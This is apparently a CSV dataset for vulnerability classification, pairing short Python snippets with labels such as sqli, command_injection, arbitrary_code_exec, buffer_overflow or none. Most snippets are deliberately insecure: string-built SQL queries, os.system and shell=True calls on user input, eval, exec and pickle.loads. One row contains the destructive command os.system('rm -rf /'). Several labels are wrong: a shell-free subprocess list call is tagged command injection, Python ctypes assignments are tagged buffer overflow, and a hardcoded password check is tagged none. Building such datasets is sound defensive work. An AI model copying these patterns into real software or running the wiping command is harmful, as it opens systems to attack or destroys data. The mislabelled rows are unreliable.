snippet,vulnerability
"user_input = input('Enter your name: ')
query = f""SELECT * FROM users WHERE name = '{user_input}'""
cursor.execute(query)",['sqli']
"import os
command = input('Enter command: ')
os.system(command)",['command_injection']
"import pickle
user_data = input('Enter your data: ')
pickle.loads(user_data)",['arbitrary_code_exec']
"from ctypes import create_string_buffer
buffer = create_string_buffer(10)
input_data = input('Enter data: ')
buffer.raw = input_data.encode()",['buffer_overflow']
"def greet(name):
    print(f""Hello, {name}!"")
greet('Alice')",['none']
"import subprocess
user_input = input('Enter filename: ')
subprocess.call(['ls', user_input])",['command_injection']
eval(input('Enter expression: ')),['arbitrary_code_exec']
"username = input('Username: ')
password = input('Password: ')
if username == 'admin' and password == 'secret':
    print('Access granted')",['none']
exec(input('Code to run: ')),['arbitrary_code_exec']
"from flask import request
@app.route('/search')
def search():
    query = request.args.get('q')
    cursor.execute(f""SELECT * FROM data WHERE item = '{query}'"")",['sqli']
"import os
os.system('rm -rf /')",['command_injection']
"import subprocess
subprocess.call(input('Command to execute: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"import pickle
pickle.loads(input('Serialized data: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"import os
os.system(input('Command: '))",['command_injection']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"import os
os.system(input('Command: '))",['command_injection']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"import os
os.system(input('Command: '))
def add(a, b):
    return a + b
print(add(2, 3))",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
eval(input('Expression: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
print('Hello, world!')",['command_injection']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import pickle
pickle.loads(input('Serialized data: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import pickle
pickle.loads(input('Serialized data: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"eval(input('Expression: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"eval(input('Expression: '))
print('Hello, world!')",['arbitrary_code_exec']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"def add(a, b):
    return a + b
print(add(2, 3))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"name = input('Enter your name: ')
print(f'Hi, {name}')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"import os
os.system(input('Command: '))",['command_injection']
eval(input('Expression: ')),['arbitrary_code_exec']
"import os
os.system(input('Command: '))",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"eval(input('Expression: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"print('Hello, world!')",['none']
"exec(input('Code: '))
def add(a, b):
    return a + b
print(add(2, 3))",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
def add(a, b):
    return a + b
print(add(2, 3))",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"import os
os.system(input('Command: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"import os
os.system(input('Command: '))",['command_injection']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
os.system(input('Command: '))
exec(input('Code: '))","['command_injection', 'arbitrary_code_exec']"
exec(input('Code: ')),['arbitrary_code_exec']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import pickle
pickle.loads(input('Serialized data: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['arbitrary_code_exec']
"import os
os.system(input('Command: '))",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
os.system(input('Command: '))",['command_injection']
"print('Hello, world!')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"print('Hello, world!')",['none']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"print('Hello, world!')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"eval(input('Expression: '))
print('Hello, world!')",['arbitrary_code_exec']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import os
os.system(input('Command: '))",['command_injection']
eval(input('Expression: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
os.system(input('Command: '))",['command_injection']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))
print('Hello, world!')",['arbitrary_code_exec']
exec(input('Code: ')),['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
exec(input('Code: ')),['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
exec(input('Code: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"import pickle
pickle.loads(input('Serialized data: '))
print('Hello, world!')",['arbitrary_code_exec']
"import os
os.system(input('Command: '))",['command_injection']
"eval(input('Expression: '))
def add(a, b):
    return a + b
print(add(2, 3))",['arbitrary_code_exec']
exec(input('Code: ')),['arbitrary_code_exec']
"print('Hello, world!')",['none']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"def add(a, b):
    return a + b
print(add(2, 3))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
eval(input('Expression: ')),['arbitrary_code_exec']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
exec(input('Code: ')),['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
print('Hello, world!')",['command_injection']
"print('Hello, world!')",['none']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def add(a, b):
    return a + b
print(add(2, 3))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"print('Hello, world!')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"eval(input('Expression: '))
print('Hello, world!')",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import os
os.system(input('Command: '))
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"exec(input('Code: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['arbitrary_code_exec', 'sqli']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))
def add(a, b):
    return a + b
print(add(2, 3))",['command_injection']
exec(input('Code: ')),['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')",['none']
"name = input('Enter your name: ')
print(f'Hi, {name}')
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
exec(input('Code: ')),['arbitrary_code_exec']
eval(input('Expression: ')),['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"import os
os.system(input('Command: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
os.system(input('Command: '))
print('Hello, world!')",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"eval(input('Expression: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"import os
os.system(input('Command: '))",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"print('Hello, world!')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import os
os.system(input('Command: '))
exec(input('Code: '))","['command_injection', 'arbitrary_code_exec']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"import pickle
pickle.loads(input('Serialized data: '))
print('Hello, world!')",['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import os
os.system(input('Command: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import pickle
pickle.loads(input('Serialized data: '))
print('Hello, world!')",['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
eval(input('Expression: ')),['arbitrary_code_exec']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"exec(input('Code: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"import os
os.system(input('Command: '))",['command_injection']
"for i in range(5):
    print(i)",['none']
"import os
os.system(input('Command: '))",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))
exec(input('Code: '))","['command_injection', 'arbitrary_code_exec']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
exec(input('Code: '))","['buffer_overflow', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"for i in range(5):
    print(i)",['none']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"for i in range(5):
    print(i)",['none']
"import os
os.system(input('Command: '))
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
eval(input('Expression: '))","['sqli', 'arbitrary_code_exec']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import os
os.system(input('Command: '))",['command_injection']
"print('Hello, world!')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['sqli', 'command_injection']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"eval(input('Expression: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"eval(input('Expression: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
eval(input('Expression: '))","['buffer_overflow', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
exec(input('Code: '))","['buffer_overflow', 'arbitrary_code_exec']"
"print('Hello, world!')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
eval(input('Expression: '))","['buffer_overflow', 'arbitrary_code_exec']"
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"for i in range(5):
    print(i)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"exec(input('Code: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['arbitrary_code_exec', 'sqli']"
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import os
os.system(input('Command: '))","['buffer_overflow', 'command_injection']"
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['buffer_overflow', 'sqli']"
"print('Hello, world!')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))",['command_injection']
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['buffer_overflow', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['buffer_overflow', 'sqli']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
